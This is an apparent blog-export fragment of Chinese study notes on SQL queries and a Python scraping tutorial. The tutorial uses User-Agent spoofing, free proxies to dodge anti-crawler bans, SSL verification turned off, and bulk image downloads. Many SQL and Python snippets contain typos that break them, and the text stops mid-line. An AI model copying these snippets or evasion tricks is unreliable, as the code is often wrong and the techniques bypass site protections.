)去重函数或其它函数搭配使用</li>\n<li>count( )详细介绍</li>\n</ul>\n<pre><code>select count(*) from 表单;  //统计总行数</code></pre><ul>\n<li>和分组函数一同查询的字段要求是group by后的字段</li>\n</ul>\n<h4 id=\"4、分组查询\"><a href=\"#4、分组查询\" class=\"headerlink\" title=\"4、分组查询\"></a>4、分组查询</h4><ol>\n<li>语法：</li>\n</ol>\n<pre><code>select 分组函数，列（要求出现在group by的后面）\nfrom 表\n[where 筛选条件]\ngroup by 分组的列表;\n[order by 子句]\n\n// 查询列表必须特殊，要求是分组函数和group by 后出现的字段</code></pre><ul>\n<li>简单的分组查询</li>\n</ul>\n<ol>\n<li>实例一：查询每个工种的最高工资</li>\n</ol>\n<pre><code>select max(salary), job_id\nfrom employees\ngroup by job_id;</code></pre><ol start=\"3\">\n<li>实例二：查询每个位置上的部门个数</li>\n</ol>\n<pre><code>select count(*), location_id\nfrom departments\ngroup by lacation_id;</code></pre><ul>\n<li>添加筛选条件的分组查询</li>\n</ul>\n<ol start=\"4\">\n<li>实例三：查询邮箱中包含a字符的，每个部门的平均工资</li>\n</ol>\n<pre><code>select avg(salsry), department_id\nfrom employees\nwhere email &#39;%a%&#39;\ngroup by department_id;</code></pre><ol start=\"5\">\n<li>实例四：查询有奖金的每个领导手下员工的最高工资</li>\n</ol>\n<pre><code>select max(salary), manager_id\nfrom employees\nwhere commission_pct is ont null\ngroup by manager_id;</code></pre><ul>\n<li>添加复杂筛选条件的分组查询</li>\n<li>分组后进行条件筛选的查询</li>\n</ul>\n<ol start=\"6\">\n<li>实例五：查询哪个部门的员工个数&gt;2</li>\n</ol>\n<pre><code>select count(*), depatment_id\nfrom employees\ngroup by department_id\nhaving count(*)&gt;2;   //用查询的结果再进行筛选时用having</code></pre><h4 id=\"5、连接查询【-优先学习99语法-】\"><a href=\"#5、连接查询【-优先学习99语法-】\" class=\"headerlink\" title=\"5、连接查询【 优先学习99语法 】\"></a>5、连接查询【 优先学习99语法 】</h4><ol>\n<li><p>含义：又称多表查询，当查询的字段来自于多个表时，就会用到连接查询</p>\n</li>\n<li><p>笛卡尔乘积现象：表1有m行，表2有n行，结果有m×n行</p>\n<ol>\n<li>发生原因：没有有效的链接条件</li>\n<li>如何避免：添加有效的连接条件</li>\n</ol>\n</li>\n<li><p>按功能分类：</p>\n<ul>\n<li><p>内连接：等值连接</p>\n<p>​               非等值连接</p>\n<p>​               自连接</p>\n</li>\n<li><p>外连接：左外连接</p>\n<p>​               右外连接</p>\n<p>​               全外连接</p>\n</li>\n<li><p>交叉连接</p>\n</li>\n</ul>\n</li>\n</ol>\n<h5 id=\"SQL92语法\"><a href=\"#SQL92语法\" class=\"headerlink\" title=\"SQL92语法\"></a>SQL92语法</h5><p>(1) 等值查询</p>\n<ul>\n<li>查询员工名和对应的部门名</li>\n</ul>\n<pre><code>select last_name, department_name\nfrom employees, departments\nwhere employees.&#39;department_id=departments.&#39;department_id&#39;;</code></pre><ul>\n<li>多条件筛选连接查询<ul>\n<li>查询有奖金的员工名，部门名</li>\n</ul>\n</li>\n</ul>\n<pre><code>select last_name, department_name, commission_pct\nfrom emplloees e, departments d\nwhere e.&#39;department_id&#39;=d.&#39;department_id&#39;\nand e.&#39;commission_pct&#39; is not null;</code></pre><p>(2) 非等值链接</p>\n<ul>\n<li>在等值链接的基础上将条件改为非等值就行</li>\n</ul>\n<p>(3) 自链接</p>\n<ul>\n<li><p>自己链接自己</p>\n</li>\n<li><p>实例:查询查询一张表中员工名和上级的名称</p>\n</li>\n</ul>\n<pre><code>select e.employee_id, e.last_name, m.employee_id, m.last_name\nfrom employees e, employees m\nwhere e.&#39;manager_id&#39;=m.&#39;employee_id&#39;;</code></pre><h5 id=\"SQL99语法\"><a href=\"#SQL99语法\" class=\"headerlink\" title=\"SQL99语法\"></a>SQL99语法</h5><ul>\n<li><p>语法： select 查询列表</p>\n<p>​            from 表1 别名</p>\n<pre><code>        [连接类型]  join 表2 别名</code></pre><p>​            on 连接条件</p>\n<p>​            where 筛选条件</p>\n<p>​            group by 分组</p>\n<p>​            having 筛选条件</p>\n<p>​            order by 排序条件</p>\n</li>\n</ul>\n<h6 id=\"内链接\"><a href=\"#内链接\" class=\"headerlink\" title=\"内链接\"></a>内链接</h6><ul>\n<li>语法：</li>\n</ul>\n<pre><code>select 查询列表\nfrom 表1 别名\ninner join 表2 别名\non 连接条件；</code></pre><ul>\n<li>分类：</li>\n</ul>\n<pre><code>内链接：inner\n外链接\n    左外：left【outer】  //括号中outer可以省去\n    右外：right 【outer】\n    全外：full 【outer\n交叉连接：cross</code></pre><ol>\n<li>等值查询（内连接）</li>\n</ol>\n<pre><code>案例1 查询员工名、部门名\nselect last_name, department_name\nfrom employees e\ninner join departments d\non e.&#39;department_id&#39; = d.&#39;department_id&#39;;</code></pre><ol start=\"2\">\n<li>非等值连接(内链接)</li>\n</ol>\n<pre><code>案例1：查询员工的工资级别\nselect salary, grdae_level\nfrom employees e\njoin job_grades g\non e.&#39;salary&#39; between g.&#39;lowest_sal&#39; and &#39;highest_sal&#39;;</code></pre><ol start=\"3\">\n<li>自连接（内连接）</li>\n</ol>\n<pre><code>查询员工的名字，上级的名字,包含字符k的\nselect e.last_name, m.last_name\njoin employees m\non e.&#39;manager_id&#39; = m.&#39;employee_id&#39;\nwhere e.&#39;last_name&#39; like &#39;%k%&#39;;</code></pre><h6 id=\"外连接\"><a href=\"#外连接\" class=\"headerlink\" title=\"外连接\"></a>外连接</h6><ul>\n<li>应用场景，一个表格有，一个表格没有</li>\n<li>特点：</li>\n</ul>\n<ol>\n<li><p>外连接的查询结果为主表中的所有记录</p>\n<p>如果从表中有和他匹配的，则显示匹配值</p>\n<p>如果从表中没有和它匹配的值，则显示null</p>\n<p>外连接查询结果=内链接结果+主表中有而从表中没有的记录</p>\n</li>\n<li><p>左外连接，left join左边的是主表</p>\n<p>右外连接，right join右边的是主表</p>\n<p>左外右外和俩个表都换一下顺序，可以实现同样的效果</p>\n</li>\n</ol>\n<ul>\n<li><p>主表：查询内容较多的表格</p>\n</li>\n<li><p>全外连接：全外连接=内连接的结果+表1中有但表2中没有的+表2中有但表1中没有的</p>\n</li>\n</ul>\n<h6 id=\"交叉连接\"><a href=\"#交叉连接\" class=\"headerlink\" title=\"交叉连接\"></a>交叉连接</h6><ul>\n<li>相当于用99语法实现的笛卡尔乘积</li>\n</ul>\n<p>图示：</p>\n<p><img src=\"https://s1.ax1x.com/2020/06/25/NBjOQf.png\" alt=\"NBjOQf.png\"></p>\n<p><img src=\"https://s1.ax1x.com/2020/06/25/NBjXy8.png\" alt=\"NBjXy8.png\"></p>\n<h4 id=\"6、子查询\"><a href=\"#6、子查询\" class=\"headerlink\" title=\"6、子查询\"></a>6、子查询</h4><ol>\n<li>含义：出现在其他语句中的select语句，称为子查询或内查询</li>\n<li>分类：</li>\n</ol>\n<pre><code>按子查询出现的位置：\n        select后面：\n            仅仅支持标量子查询\n        from后面：\n            支持表子查询\n        where或having后面： // 重点\n            标量子查询       //  重点\n            列子查询        // 重点\n            行子查询        // 重点\n        exists后面（相关子查询）\n            表子查询\n按结果集的行列数不同：\n        标量子查询：结果集只有一行一列\n        列子查询：结果集有一列多行\n        行子查询：结果集有一行多列\n        表子查询：结果集有多行多列</code></pre><ul>\n<li>（一）where或having后面</li>\n</ul>\n<ol>\n<li><p>标量子查询（单行子查询）</p>\n</li>\n<li><p>列子查询（多行子查询）</p>\n</li>\n<li><p>行子查询（多行多列）</p>\n</li>\n<li><p>特点：（1）子查询放在小括号内</p>\n<p>​           （2）子查询一般放在条件的右侧</p>\n<p>​            （3）标量子查询，一般搭配着单行操作符使用&lt;  &gt; =   &gt;=  &lt;=等</p>\n<p>​                     列子查询，一般搭配多行操作符使用 in, any,some, all</p>\n<p>​              (4)子查询的执行优先于主查询，因为主查询要用到子查询</p>\n</li>\n<li><p>标量子查询</p>\n</li>\n</ol>\n<pre><code>案例：谁的工资比sam高？\n#查询sam的工资\nselect salary\nfrom employees\nwhere last_name = &#39;sam&#39;；\n\n#查询员工的信息，满足salary &gt; sam工资 的结果\nselect *\nfrom employees\nwhere salary &gt;(\n    select salary\n    from employees      //为更清晰的表达，子查询最好进行缩进\n    where last_name = &#39;sam&#39;  \n)；</code></pre><pre><code>案例：返回公司工资最少的员工的last_name,job_id,salary\n#查询公司的最低工资\nselect min(salary)\nfrom empolyees;\n\n#查询last_name, job_id, salary, 要求salary= 公司的最低工资\nselect last_name, job_id, salary\nfrom employees\nwhere salary=(\n    select min(salary)\n    from empolyees\n);</code></pre><ol start=\"2\">\n<li>列子查询(多行子查询）</li>\n</ol>\n<pre><code>案例：返回location_id是1400或1700的部门中的所有员工姓名\n#查询location_id是1700或1400的部门编号\nselect department_id\nfrom departments\nwhere location_id in(1400, 1700);\n\n#查询员工姓名，要求部门号是上个查询结果中的某一个\nselect employees\nwhere department_id in(\n    select department_id\n    from departments\n    where location_id in(1400, 1700)\n);</code></pre><ol start=\"3\">\n<li><p>行子查询（多行多列）</p>\n<p>略</p>\n</li>\n</ol>\n<ul>\n<li>（二）放在select后面的标量子查询</li>\n</ul>\n<pre><code>案例：查询每个部门的员工个数\nselect d.*, (\n    select count(*)\n    from empolyees e\n    where e.department_id = d.&#39;department_id&#39;\n) 个数\nfrom departments d;</code></pre><ul>\n<li>（三）放在from后面<ul>\n<li>将子查询结果当成一张表，要求必须起别名</li>\n</ul>\n</li>\n</ul>\n<pre><code>案例：查询每个部门的平均工资的平均等级\n#查询每个部门的平均工资\nselect avg(salary), department_id\nfrom employees\ngroup by department_id\n\n#连接上个查询结果集和job_grades表，筛选条件平均工资\nselect ag_dep.*, g.&#39;grade_level&#39;\nfrom(\n    select avg(salary), department_id\n    from employees\n    group by department_id\n) ag_dep\ninner join job_grades g\non ag_dep.ag between lowest_sal and highest_sal;</code></pre><ul>\n<li>（四）放在exists后面（相关子查询）<ul>\n<li>能用exists的都能用in代替</li>\n</ul>\n</li>\n</ul>\n<pre><code>语法：\n    exists 完整的查询语句\n结果：0或1   //返回一个布尔值</code></pre><pre><code>案例：查询员工的部门名\nselect department_name\nfrom departments d\nwhere exists(\n    select *\n    from employees e\n    where d.&#39;department_id&#39;=e.&#39;depaertment_id&#39;\n);</code></pre><h4 id=\"7、分页查询\"><a href=\"#7、分页查询\" class=\"headerlink\" title=\"7、分页查询\"></a>7、分页查询</h4><ol>\n<li>应用场景：当要显示的数据，一页显示不全，需要枫叶提交sql请求</li>\n<li>语法：</li>\n</ol>\n<pre><code>select 查询列表\nfrom 表\n连接类型 join 表2\non 连接条件\nwhere 筛选条件\ngroup by 分组字段\nhaving 分组后的筛选\norder by 排序的字段\nlimit offset, size;\n\noffset要显示条目的起始索引（起始索引从0开始）\nsize 要显示的条目个数</code></pre><ol start=\"3\">\n<li>案例：查询前五条员工信息</li>\n</ol>\n<pre><code>select * from employees limit 0, 5;</code></pre><ol start=\"4\">\n<li>案例2：查询11条—第25条</li>\n</ol>\n<pre><code>select * from employees limit 10, 15;</code></pre><ol start=\"5\">\n<li>案例3：有奖金的员工信息，并且工资较高的前10名显示出来</li>\n</ol>\n<pre><code>select *\nfrom employees\nwhere commission_pic is not null\norder by salsry desc\nlimit 10;</code></pre><ol start=\"6\">\n<li>特点：</li>\n</ol>\n<ul>\n<li>limit语句放在查询语句德尔最后</li>\n<li>公式：要显示的页数page，每页的条目数size</li>\n</ul>\n<pre><code>select 查询列表\nfrom 表\nlimit (page-1)*size, size;</code></pre><h4 id=\"8、联合查询\"><a href=\"#8、联合查询\" class=\"headerlink\" title=\"8、联合查询\"></a>8、联合查询</h4><ol>\n<li>union联合 ：将多个查询语句的结果合并成一个结果</li>\n<li>语法：</li>\n</ol>\n<pre><code>查询语句1\nunion\n查询语句2\nunion\n...</code></pre><ol start=\"3\">\n<li>案例：查询部门编号&gt;90或邮箱包含a的员工信息</li>\n</ol>\n<pre><code>select *\nfrom employees\nwhere email like &#39;%a%&#39; or deaprtment_id&gt;90;\n\nselect *\nfrom employees\nwhere email like &#39;%a%&#39;\nunion\nselect *\nfrom employees\nwhere deparment_id&gt;90;</code></pre><ol start=\"4\">\n<li>特点：</li>\n</ol>\n<ul>\n<li>要求多条查询语句的查询列数是一致的</li>\n<li>要求多条查询语句的查询的每一列的类型和顺序最好一致</li>\n<li>union关键字默认去重，如果使用union all 可以包含重复选项</li>\n</ul>"},{"title":"python爬虫实战","date":"2020-05-03T01:08:28.000Z","comments":1,"_content":"\n# 爬虫第一天\n\n- urllib太过古老，因此不加以深入学习\n\n### requests\nrequests模块：python中原生的一款基于网络请求的模块，功能强大，简单便捷，效率高。\n作用：模拟浏览器发送请求。\n\n如何使用：（requests模块的编码流程）\n    -指定url\n    -发起请求（get或post）\n    -获取响应数据\n    -持久化存储（数据库或本地存储）\n\n环境安装：\n    -pip或pycharm安装\n    -anaconda自带（方便已装）\n    \n<!--more-->\n\n### **实战编码：**\n\n    - 需求：爬取拉勾网首页的数据\n        示例：\n\n```python\nimport requests\n\nif __name__ == '__main__':\n    #step 1:指定url\n    url = \"https://www.lagou.com/jobs/6889986.html?show=96e52fa1d2134ad483eac5662bcc9fc6\"\n\n    #step_2:发起请求\n    #get会返回一个响应对象\n    response = requests.get(url=url)\n\n    #step_3:获取相应数据(.text返回的是字符串形式的响应数据)\n    page_text = response.text\n    print(page_text)\n\n    #step_4:持久化存储\n    with open('./lagou.html', 'w', encoding = 'utf-8') as fp:\n        fp.write(page_text)\n    print('爬取数据结束')\n```\n- 以上代码极有可能会被网站捕获，被识别出为爬虫，所以需要实施反爬虫策略\n\n- 示例： \n  UA:User-Agent (请求载体的身份标识)\n  UA检测：门户网站的服务器会检测对应的载体身份标识，如果检测到请求的载体身份标识为某一款浏览器，\n  说明该请求是一个正常的请求。但是，如果监测到请求的载体身份标识不是基于某一款浏览器的，则表示\n  该请求为不正常的请求（爬虫），则服务器端就很有可能拒绝这次请求。\n  UA伪装:将对应的请求载体身份标识伪装成一款浏览器\n\n```python\nimport requests\n\nif __name__ == '__main__':\n    # UA伪装：将对应的User-Agent封装到一个字典中\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n\n    url = 'https://www.sogou.com/web?'\n\n    #处理url携带的参数：封装到字典中（参数为问号后面的）\n    kw = input('enter a word:')\n    param = {\n        'query': kw\n    }\n\n    # 需求的响应返回的是一个对象，对象应实例化\n    response = requests.get(url=url, params=param, headers=headers)\n\n    # 确认相应数据是txt类型的\n    page_text = response.text\n    fileName = kw+'.html'\n    with open(fileName, 'w', encoding='utf-8') as fp:\n        fp.write(page_text)\n    print('保存成功。。。')\n\n```\n\n# 爬虫第二天\n\n### 有关于ajax\n#### 爬取百度翻译的内容\n\n```python\nimport requests\nimport json\n\nif __name__ == '__main__':\n    #获取url\n    post_url = 'https://fanyi.baidu.com/sug'\n    #进行UA伪装\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n    #post请求的参数处理（同get请求一致）\n    word = input('输入你想翻译的东西:')\n    data = {\n        'kw': word\n    }\n    #发送请求并生成响应\n    response = requests.post(url=post_url, data=data, headers=headers)\n    #获取响应数据:\n    #json()方法返回的是obj （如果确认响应数据是json类型的）\n    dic_obj = response.json()\n\n    #持久化存储\n    filename = word+'.json'\n    with open(filename, 'w', encoding='utf-8') as fp:\n        json.dump(dic_obj, fp=fp, ensure_ascii=False)\n\n    #将jaon格式转化成dict格式\n    with open(filename, 'r', encoding='utf-8') as fp:\n        great = json.load(fp)\n\n    #将字典格式化输出(此字典中存在字典与列表的嵌套现象)\n    for k, v in great.items():\n        if type(v) == list:\n            for i in v:\n                print(i)\n        else:\n            print(k)\n            print(v)\n\n    print('end...')\n\n```\n\n### 爬取豆瓣电影信息\n\n```python\n##此处代码示例为失败的例子，未考虑到由ajax得到的页面依旧采用了ajax\n\nimport requests\nimport json\n\nif __name__ == '__main__':\n    url = 'https://movie.douban.com/j/chart/top_list'\n    param = {\n        'type': ' 24',\n        'interval_id': ' 100:90',\n        'action': '',\n        'start': ' 1',\n        'limit': ' 20',\n    }\n    headers = {\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n\n    response = requests.get(url=url, params=param, headers=headers)\n\n    list_data = response.json()\n\n    with open('./douban.json', 'w', encoding='utf-8') as fp:\n        json.dump(list_data, fp, ensure_ascii=False)\n\n    with open('./douban.json', 'r', encoding='utf-8') as fp:\n        great = json.load(fp)\n\n    print(great)\n```\n# 爬虫学习第三天\n### 爬取国家药监总局部分信息\n\n```python\nimport requests\nimport json\n\nif __name__ == '__main__':\n    url = 'http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsList'\n    url_2 = 'http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsById'\n    headers = {\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n    #爬取的页数\n    page_ = input(\"请输入您想爬取的信息页数：\")\n    for page in range(1, int(page_)+1):\n        data = {\n            'on': 'true',\n            'page': page,\n            'pageSize': '15',\n            'productName': '',\n            'conditionType': '1',\n            'applyname': '',\n            'applysn': '',\n        }\n        #id_list have many ids\n        id_list = []\n        message = []\n\n        json_list = requests.post(url=url, data=data, headers=headers).json()\n        #id_a is a dict\n        for id_a in json_list[\"list\"]:\n            id_list.append(id_a[\"ID\"])\n            #id_b是id号\n        for id_b in id_list:\n                data_2 = {\n                    \"id\": str(id_b)\n                }\n                detail_message = requests.post(url=url_2, data=data_2, headers=headers).json()\n                print(detail_message)\n                message.append(detail_message)\n    with open('./药物信息.json', 'w', encoding='utf-8') as fp:\n        json.dump(message, fp, ensure_ascii=False)\n    print('end...')\n\n'''此代码爬取时间可能有些长，也有可能会出现Timeouterror错误，多试几次可能就可以了'''\n'''出现这种情况的原因是对方服务器拒绝请求（反爬虫），，，后续继续学习反反爬虫技术'''\n```\n\n### 数据解析概述\n\n- 聚焦爬虫：爬取页面中指定的页面内容\n      -编码流程\n          1、指定url\n          2、发起请求\n          3、获取相应数据\n          4、持久化存储\n          \n  -数据解析分类：\n          -正则\n          -bs4\n          -xpath\n          \n  -数据解析原理概述\n          -解析的局部的文本内容都会在标签之间或者标签对应的属性中进行存储\n          -1、进行指定标签的定位\n          -2、标签或者标签对应属性中存储的数据值进行提取（解析）\n\n### 图片的爬取代码\n\n```python\nimport requests\n#此处url为图片地址，而非链接【地址比链接短】\nurl = 'https://tse4-mm.cn.bing.net/th/id/OIP.vLPcBX_5hWArkIbn_PqvYgHaGL?w=233&h=195&c=7&o=5&dpr=1.25&pid=1.7'\nheaders = {\n        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n}\n#图片以二进制的形式存储，所以以.content形式接收，以jpg格式存\ndata_pict = requests.get(url=url, headers=headers).content\nwith open('./beauty_pict.jpg', 'wb') as fp:\n    fp.write(data_pict)\n```\n\n# 爬虫第四天\n### 爬取百度图片（星空图片）\n\n```python\nimport requests\nimport re\nimport os\nimport time\n\nif __name__ == '__main__':\n    #创建一个文件夹，存放图片\n    if not os.path.exists('./star_sky'):\n        os.mkdir('./star_sky')\n        \n    url = 'https://cn.bing.com/images/search?q=%E6%98%9F%E7%A9%BA%E5%9B%BE%E7%89%87&qpvt=%e6%98%9f%e7%a9%ba%e5%9b%be%e7%89%87&form=IGRE&first=1&cw=1117&ch=714'\n    headers = {\n            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n    data_pict = requests.get(url=url, headers=headers).text\n\n    #正则匹配\n    ex = '<a class=.*?murl&quot;:&quot;(.*?)&quot;.*?>'\n    star_list = re.findall(ex, data_pict, re.S)\n    for i in star_list:\n        url_2 = i\n        #请求到了图片的二进制数据\n        data_2_pict = requests.get(url=url_2, headers=headers).content\n        #为图片设置名称\n        img_name = url_2.split(\"/\")[-1]\n        img_path = './star_sky/' + img_name\n        with open(img_path, 'wb') as fp:\n            fp.write(data_2_pict)\n        print(img_name + '...successful')\n        time.sleep(0.1)\n\n****************************************未完，，待更新********************************************\n```\n### xpath\n\n- xpath解析：最常用且最便捷高效的一种解析方式，具有通用性\n      -xpath解析原理：\n          -1、实例化一个etree对象，且需要将被解析的页面源码数据加载到该对象中\n          -2、调用etree对象中的xpath方法结合着xpath表达式实现标签的定位和内容的捕获\n      -如何实例化一个etree对象\n          *from lxml import etree\n          -1、将 本地的html文档中的源代码数据加载到etree对象中：\n              etree.parse(filepath)\n          -2、可以将从互联网上获取的数据加载到该对象中\n              etree.HTML('page_text')###page_text就是获取的响应数据\n          - xpath('xpath表达式')\n          -xpath表达式：\n                  - / ：表示的是从根目录结点开始定位，表示的是一个层级\n                          - // : 表示的是多个层级或从任意位置开始定位（前提是//前面没有结点）\n                          -属性定位：tag[@attrName=\"attrValue\"]\n                          -索引定位：p[n] 索引是从1开始的\n                          -取文本：\n              - /text() 获取的是标签中直系的文本内容\n              - //text() 标签中非直系的文本内容（所有的文本内容）\n              -[0] 可以去除列表框\n                  -取属性\n              -/@attrName\n              \n\n### xpath代码实战示例：\n\n```python\n#爬取妹子图片，总共有俩千多张\nimport requests\nfrom lxml import etree\nimport os\n\nif __name__ == '__main__':\n    ii = 1\n    if not os.path.exists('./girl'):\n        os.mkdir('./girl')\n    url_list = [i for i in range(1, 50)]\n    url_list[1] = ''\n\n    for page in url_list:\n        url = 'https://www.lanvshen.com/zhongguo/' + str(page) +'.html'\n        headers = {\n            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n        }\n        get_text = requests.get(url=url, headers=headers)\n        tree = etree.HTML(get_text.text)\n        pict_ = tree.xpath('//div[@class=\"hezi\"]//li')\n        for it_ in pict_:\n            img_url = it_.xpath('./a/img/@src')[0]\n            img_name = str(ii) + '.jpg'\n            img = requests.get(url=img_url, headers=headers).content\n            img_path = './girl/' + img_name\n            with open(img_path, 'wb') as fp:\n                fp.write(img)\n            print(img_name + 'sccuessful...')\n            ii = ii + 1\n\n##此代码存在许多不足之处，所爬取的图片都只是像素低的缩略图，并且下载速度较慢\n##后期将学习爬取高清图片，并进行分布式爬取\n\n```\n\n\n\n### ip代理\n\n1. 代理的原理：在请求目的网站之前，先请求代理服务器，然后让代理服务器去请求目的网站，\n   代理服务器拿到目的网站的数据后，再转发给我们的代码\n2. [这个网站可以方便的查看http请求的一些参数](http://httpbin.org) \n3. 在代码中(requests模块)使用代理：\n\n```python\n\timport requests\n\n\turl = 'http://httpbin.org'\n\theaders = {\n\t\t'User-Anget': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n\t}\n\n\t#设置代理\n\tproxy = {\n\t\t'http': '123.54.194.96:38661'\n\t}\n\tget_text = requerts.get(url=url, headers=headers, proxies=proxy).text\n\tprint(get_text)\n```\n\n4. 网络代理有付费和不需要付费的，不需要付费的不稳定，常常会失效\n5. 代理的作用是防止我们在爬取服务器的数据时被反爬虫而被封禁导致我们\n   的 ip 不能用而采取的措施，选择代理应选择隐蔽性高，不透明的\n\n### cookie \n\n* [cookie与session的差异](http://blog.sina.com.cn/s/blog_628571e601019uis.html)\n\n* [cookie技术深入](http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=200538817&idx=2&sn=1147d48f2320fa37e82a7daef4f31c11#rd )\t\t\t \n\n  - Cookie是什么？\t \n\n  Cookie 是一小段文本信息，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。\n  Cookie 包含每次用户访问站点时 Web 应用程序都可以读取的信息。\n\n  - 为什么需要Cookie？ \n\n    因为HTTP协议是无状态的，对于一个浏览器发出的多次请求，WEB服务器无法区分 是不是来源于同一个浏览器。\n    所以，需要额外的数据用于维护会话。Cookie 正是这样的一段随HTTP请求一起被传递的额外数据。\n\n  - Cookie能做什么？ \n\n    Cookie只是一段文本，所以它只能保存字符串。而且浏览器对它有大小限制以及 它会随着每次请求被发送到服务器，所以应该保证它\n    不要太大。Cookie的内容也是明文保存的，有些浏览器提供界面修改，所以， 不适合保存重要的或者涉及隐私的内容。\n\n  - Cookie 的限制\n\n    大多数浏览器支持最大为 4096 字节的 Cookie。由于这限制了 Cookie 的大小，最好用 Cookie 来存储少量数据，\n    或者存储用户 ID 之类的标识符。用户 ID 随后便可用于标识用户，以及从数据库或其他数据源中读取用户信息。 \n    浏览器还限制站点可以在用户计算机上存储的 Cookie 的数量。大多数浏览器只允许每个站点存储 20 个 Cookie；\n    如果试图存储更多 Cookie，则最旧的 Cookie 便会被丢弃。有些浏览器还会对它们将接受的来自所有站点的 Cookie\n    总数作出绝对限制，通常为 300 个。\n\n![Cookie示意图](C:/Users/Acer/Desktop/笔记/爬虫_day4_files/1.jpg)\t\n\n- 处理cookie\n  如果想要在多次请求中共享cookie，那么应该使用session\n\n### 处理不信任的SSL证书\n\n```python\nresp = resquests.get(url=url, vrrify=False).content\n\n```\n\n### 多线程\n\n* 多线程之生产者与消费者模型\n\n- 代码示例一：(Lock版)\n\n```python\n\t\"\"\"\n\t关于多线程生产者消费者模型\n\t\"\"\"\n\timport threading\n\timport time\n\timport random\n\n\tgMoney = 1000\n\tgLock = threading.Lock()\n\tgTotalTimes = 10\n\tgTimes = 0\n\n\n\t# 生产线程Producer\n\tclass Producer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal gMoney\n\t\t\tglobal gTimes\n\t\t\twhile True:\n\t\t\t\tmoney = random.randint(100, 1000)\n\t\t\t\tgLock.acquire()\n\t\t\t\tif gTimes >= gTotalTimes:\n\t\t\t\t\tgLock.release()\n\t\t\t\t\tbreak\n\t\t\t\tgMoney += money\n\t\t\t\tprint('{}生产了{}元钱，剩余{}元钱'\n\t\t\t\t\t  .format(threading.current_thread(), money, gMoney))\n\t\t\t\tgTimes += 1\n\t\t\t\tgLock.release()\n\t\t\t\ttime.sleep(0.5)\n\n\n\t# 消费线程Consumer\n\tclass Consumer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal gMoney\n\t\t\twhile True:\n\t\t\t\tmoney = random.randint(100, 1000)\n\t\t\t\tgLock.acquire()\n\t\t\t\tif gMoney >= money:\n\t\t\t\t\tgMoney -= money\n\t\t\t\t\tprint('{}消费者消费了{}元钱，剩余{}元钱'\n\t\t\t\t\t\t  .format(threading.current_thread(), money, gMoney))\n\t\t\t\t# 若剩余金额不足以消费，则退出循环\n\t\t\t\telse:\n\t\t\t\t\tif gTimes >= gTotalTimes:\n\t\t\t\t\t\tgLock.release()\n\t\t\t\t\t\tbreak\n\t\t\t\t\tprint('{}消费者准备消费{}元钱，剩余{}元钱，不足！'\n\t\t\t\t\t\t  .format(threading.current_thread(), money, gMoney))\n\t\t\t\tgLock.release()\n\t\t\t\ttime.sleep(0.5)\n\n\n\tdef mainIt():\n\t\t# 设置3个消费线程\n\t\tfor x in range(3):\n\t\t\tt = Consumer(name='消费者线程{}'.format(x))\n\t\t\tt.start()\n\t\t\t# 设置5个生产线程\n\n\t\tfor x in range(5):\n\t\t\tt = Producer(name='生产者线程{}'.format(x))\n\t\t\tt.start()\n\n\n\tif __name__ == '__main__':\n\t\tmainIt()\n\n```\n\n- 代码示例二：(condition版)\n\n```python\n \n\timport threading\n\timport random\n\timport time\n\n\tgMoney = 1000\n\tgCondition = threading.Condition()  # 等同于threading.Lock\n\tgTimes = 0\n\tgTotalTimes = 5\n\t\n\n\tclass Producer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal gMoney\n\t\t\tglobal gCondition\n\t\t\tglobal gTimes\n\t\t\twhile True:\n\t\t\t\tmoney = random.randint(100, 1000)\n\t\t\t\tgCondition.acquire()  # 加锁（全局变量改变前（gMoney））\n\t\t\t\tif gTimes >= gTotalTimes:\n\t\t\t\t\tgCondition.release()  # 解锁\n\t\t\t\t\tprint(\"当前生产者总共生产了%s次\" % gTimes)\n\t\t\t\t\tbreak\n\t\t\t\tgMoney += money\n\t\t\t\tprint(\"%s当前存入%s元钱，剩余%s元线\" % (threading.current_thread(), money, gMoney))\n\t\t\t\tgTimes += 1\n\t\t\t\tgCondition.notify_all()  # 通知正在等待的线程（wait）\n\t\t\t\tgCondition.release()\n\t\t\t\ttime.sleep(0.5)\n\n\n\tclass Cosumer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal gMoney\n\t\t\twhile True:\n\t\t\t\tmoney = random.randint(100, 1000)\n\t\t\t\tgCondition.acquire()\n\t\t\t\twhile gMoney < money:\n\t\t\t\t\tif gTimes >= gTotalTimes:\n\t\t\t\t\t\tgCondition.release()\n\t\t\t\t\t\treturn\n\t\t\t\t\tprint(\"%s准备消费%d元钱，剩余%d元钱，不足\" % (threading.current_thread(), money, gMoney))\n\t\t\t\t\tgCondition.wait()  # 等待状态  （获取锁） 直到生产者把钱加上 （有钱了再去排队消费）\n\t\t\t\tgMoney -= money\n\t\t\t\tprint(\"%s消费了%d元钱，剩余%d元钱\" % (threading.current_thread(), money, 